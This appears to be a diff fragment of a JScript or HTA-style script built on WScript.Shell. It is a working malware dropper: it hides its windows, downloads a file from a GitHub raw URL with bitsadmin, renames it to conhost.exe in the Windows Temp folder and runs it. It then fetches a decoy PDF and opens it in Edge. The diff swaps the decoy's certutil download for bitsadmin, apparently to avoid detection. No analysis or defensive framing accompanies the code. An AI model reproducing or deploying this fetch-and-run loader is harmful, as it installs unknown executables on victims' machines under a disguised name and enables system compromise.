@@ -15,19 +15,19 @@
 try {
     var shell = new ActiveXObject("WScript.Shell");
 
-    
+   
     shell.Run("cmd /c bitsadmin /transfer job /download /priority foreground https://raw.githubusercontent.com/zalehuoer/repo1/refs/heads/main/ca.txt C:\\Windows\\Temp\\ca.txt", 0, true);
 
     
     shell.Run("cmd /c rename C:\\Windows\\Temp\\ca.txt conhost.exe", 0, true);
 
-    
+   
     shell.Run("C:\\Windows\\Temp\\conhost.exe", 0, false);
 
     
-    shell.Run("cmd /c certutil -urlcache -split -f https://raw.githubusercontent.com/zalehuoer/repo1/refs/heads/main/bbb.pdf C:\\Windows\\Temp\\bbb.pdf", 0, true);
+    shell.Run("cmd /c bitsadmin /transfer job /download /priority foreground https://raw.githubusercontent.com/zalehuoer/repo1/refs/heads/main/bbb.pdf C:\\Windows\\Temp\\bbb.pdf", 0, true);
 
-  
+   
     shell.Run("msedge.exe file:///C:/Windows/Temp/bbb.pdf", 0, false);
 
     window.close();
